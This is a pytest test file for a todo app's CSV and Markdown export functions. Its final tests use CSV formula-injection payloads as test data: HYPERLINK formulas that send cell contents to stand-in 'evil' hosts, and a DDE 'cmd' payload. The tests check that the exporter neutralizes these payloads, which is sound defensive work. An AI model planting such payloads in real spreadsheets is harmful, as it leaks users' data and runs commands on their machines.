import csv
import io
from datetime import date

import pytest

from todo.export import export, to_csv, to_markdown
from todo.storage import Item

ITEMS = [
    Item(1, "milk", due=date(2026, 11, 1)),
    Item(2, 'say "hi", then *leave*', done=True),
    Item(3, "eggs"),
]


def test_csv():
    assert to_csv(ITEMS) == (
        "id,title,done,due,tags,priority,every\n"
        "1,milk,no,2026-11-01,,,\n"
        '2,"say ""hi"", then *leave*",yes,,,,\n'
        "3,eggs,no,,,,\n"
    )


def test_csv_empty_has_header():
    assert to_csv([]) == "id,title,done,due,tags,priority,every\n"


def test_markdown_groups_done_last_and_escapes():
    assert to_markdown(ITEMS) == (
        "# Todo\n\n"
        "- [ ] milk (due 2026-11-01)\n"
        "- [ ] eggs\n\n"
        "## Done\n\n"
        '- [x] say "hi", then \\*leave\\*\n'
    )


def test_markdown_empty():
    assert to_markdown([]) == "# Todo\n\n_No items._\n"


def test_unknown_format():
    with pytest.raises(ValueError, match="'xml'"):
        export(ITEMS, "xml")


def test_cli_export_stdout(cli):
    cli("add", "milk", "--due", "2026-11-01")
    assert cli("export", "--format", "csv") == ["id,title,done,due,tags,priority,every\n1,milk,no,2026-11-01,,,"]


def test_cli_export_to_file(cli, tmp_path):
    cli("add", "milk")
    out = tmp_path / "todo.md"
    assert cli("export", "--format", "md", "--out", str(out)) == [
        f"exported 1 items to {out}"
    ]
    assert out.read_text() == "# Todo\n\n- [ ] milk\n"


def test_cli_export_rejects_unknown_format(cli, capsys):
    with pytest.raises(SystemExit) as exc:
        cli("export", "--format", "xml")
    assert exc.value.code == 2


TAGGED = [
    Item(1, "buy milk", due=date(2026, 11, 1), tags=["groceries", "home"], priority="high"),
    Item(2, "call mum", tags=["home"], priority="medium"),
    Item(3, "file taxes", done=True, tags=["work"], priority="low"),
    Item(4, "fix_bug", done=True, tags=["to_do"]),
]


def test_csv_tags_and_priority():
    assert to_csv(TAGGED) == (
        "id,title,done,due,tags,priority,every\n"
        "1,buy milk,no,2026-11-01,groceries home,high,\n"
        "2,call mum,no,,home,medium,\n"
        "3,file taxes,yes,,work,low,\n"
        "4,fix_bug,yes,,to_do,,\n"
    )


def test_markdown_tags_and_priority_match_list_line():
    assert to_markdown(TAGGED) == (
        "# Todo\n\n"
        "- [ ] buy milk (due 2026-11-01) !! #groceries #home\n"
        "- [ ] call mum ! #home\n\n"
        "## Done\n\n"
        "- [x] file taxes #work\n"
        "- [x] fix\\_bug #to\\_do\n"
    )


def test_markdown_sort_holds_within_each_group():
    items = [TAGGED[3], TAGGED[1], TAGGED[2], TAGGED[0]]
    assert to_markdown(items).splitlines()[2:] == [
        "- [ ] call mum ! #home",
        "- [ ] buy milk (due 2026-11-01) !! #groceries #home",
        "",
        "## Done",
        "",
        "- [x] fix\\_bug #to\\_do",
        "- [x] file taxes #work",
    ]


RECURRING = [
    Item(1, "pay rent", due=date(2026, 11, 1), tags=["home"], priority="high", every="month"),
    Item(2, "water plants", due=date(2026, 11, 10), every="2 weeks"),
    Item(3, "buy milk"),
]


def test_csv_every_column_holds_rule_or_empty():
    assert to_csv(RECURRING) == (
        "id,title,done,due,tags,priority,every\n"
        "1,pay rent,no,2026-11-01,home,high,month\n"
        "2,water plants,no,2026-11-10,,,2 weeks\n"
        "3,buy milk,no,,,,\n"
    )


def test_markdown_rule_after_due_before_priority_and_tags():
    assert to_markdown(RECURRING) == (
        "# Todo\n\n"
        "- [ ] pay rent (due 2026-11-01) ↻ every month !! #home\n"
        "- [ ] water plants (due 2026-11-10) ↻ every 2 weeks\n"
        "- [ ] buy milk\n"
    )


def test_cli_export_recurring_matches_list_line(cli):
    cli("add", "pay rent", "--due", "2026-11-01", "--every", "month", "--tag", "home")
    assert cli("export", "--format", "csv") == [
        "id,title,done,due,tags,priority,every\n1,pay rent,no,2026-11-01,home,,month"
    ]
    md_line = cli("export", "--format", "md")[0].splitlines()[2]
    assert md_line == "- " + cli("list")[0].replace(" 1:", "", 1)


def test_export_does_not_import_cli():
    import todo.export.csv_export as csv_mod
    import todo.export.markdown as md_mod

    for mod in (csv_mod, md_mod):
        assert "todo.cli" not in open(mod.__file__).read()


@pytest.fixture
def mixed(cli):
    """A todo file with tags, priorities, due dates and done items."""
    cli("add", "buy milk", "--due", "2026-11-03", "--tag", "groceries,home", "--priority", "low")
    cli("add", "call mum", "--tag", "home", "--priority", "high")
    cli("add", "file taxes", "--due", "2026-11-01", "--tag", "work", "--priority", "high")
    cli("add", "buy eggs", "--tag", "groceries")
    cli("add", "pay rent", "--due", "2026-11-02", "--tag", "home", "--priority", "medium")
    cli("done", "3")
    cli("done", "4")
    return cli


def csv_ids(lines):
    return [int(row.split(",")[0]) for row in lines[0].splitlines()[1:]]


def list_ids(lines):
    return [int(line.split(":")[0].split("] ")[1]) for line in lines]


FLAGS = [
    [],
    ["--tag", "home"],
    ["--tag", "home", "--tag", "groceries"],
    ["--priority", "high"],
    ["--open"],
    ["--done"],
    ["--search", "BUY"],
    ["--search", "work"],
    ["--sort", "priority"],
    ["--sort", "due"],
    ["--tag", "home", "--open", "--sort", "due"],
]


@pytest.mark.parametrize("flags", FLAGS, ids=lambda f: " ".join(f) or "none")
def test_cli_export_selects_same_items_as_list(mixed, flags):
    assert csv_ids(mixed("export", "--format", "csv", *flags)) == list_ids(mixed("list", *flags))


def test_cli_export_filter_examples(mixed):
    assert csv_ids(mixed("export", "--format", "csv", "--tag", "home")) == [1, 2, 5]
    assert csv_ids(mixed("export", "--format", "csv", "--priority", "high")) == [2, 3]
    assert csv_ids(mixed("export", "--format", "csv", "--open")) == [1, 2, 5]
    assert csv_ids(mixed("export", "--format", "csv", "--done")) == [3, 4]
    assert csv_ids(mixed("export", "--format", "csv", "--search", "groc")) == [1, 4]
    assert csv_ids(mixed("export", "--format", "csv", "--sort", "priority")) == [2, 3, 5, 1, 4]
    assert csv_ids(mixed("export", "--format", "csv", "--sort", "due")) == [3, 5, 1, 2, 4]


def test_cli_export_markdown_filtered_and_sorted(mixed):
    assert mixed("export", "--format", "md", "--tag", "home", "--sort", "priority") == [
        "# Todo\n\n"
        "- [ ] call mum !! #home\n"
        "- [ ] pay rent (due 2026-11-02) ! #home\n"
        "- [ ] buy milk (due 2026-11-03) #groceries #home"
    ]


def test_cli_export_out_counts_selection(mixed, tmp_path):
    out = tmp_path / "todo.csv"
    assert mixed("export", "--format", "csv", "--out", str(out), "--tag", "groceries") == [
        f"exported 2 items to {out}"
    ]
    assert out.read_text() == (
        "id,title,done,due,tags,priority,every\n"
        "1,buy milk,no,2026-11-03,groceries home,low,\n"
        "4,buy eggs,yes,,groceries,,\n"
    )


def test_cli_export_open_and_done_exit_2(cli):
    with pytest.raises(SystemExit) as exc:
        cli("export", "--format", "csv", "--open", "--done")
    assert exc.value.code == 2


@pytest.mark.parametrize("title", ['=HYPERLINK("http://evil/?"&A1,"x")', "+1", "-1", "@SUM(A1)", "\tx", "\rx"])
def test_csv_neutralizes_formula_titles(title):
    rows = list(csv.reader(io.StringIO(to_csv([Item(1, title)]))))
    assert rows[1][1] == "'" + title


@pytest.mark.parametrize("tag", ['=hyperlink("http://evil/?"&a1,"x")', "+1", "-1", "@sum(a1)"])
def test_csv_neutralizes_formula_tags(tag):
    rows = list(csv.reader(io.StringIO(to_csv([Item(1, "a", tags=[tag])]))))
    assert rows[1][4] == "'" + tag


@pytest.mark.parametrize(
    "item",
    [
        Item(1, "pay rent;=cmd|' /C calc'!A0;"),
        Item(1, 'buy milk;=HYPERLINK("http://evil.example/?"&A1,"x")'),
        Item(1, "a;+1;-1;@sum(a1)"),
        Item(1, "a", tags=["home;=1+1"]),
    ],
)
def test_csv_has_no_formula_cell_when_read_with_semicolon_separator(item):
    # Excel in pt-PT, de-DE or fr-FR splits on `;`, so every `;`-part is its own cell.
    for row in csv.reader(io.StringIO(to_csv([item])), delimiter=";"):
        for part in row:
            assert not part.startswith(("=", "+", "-", "@")), part
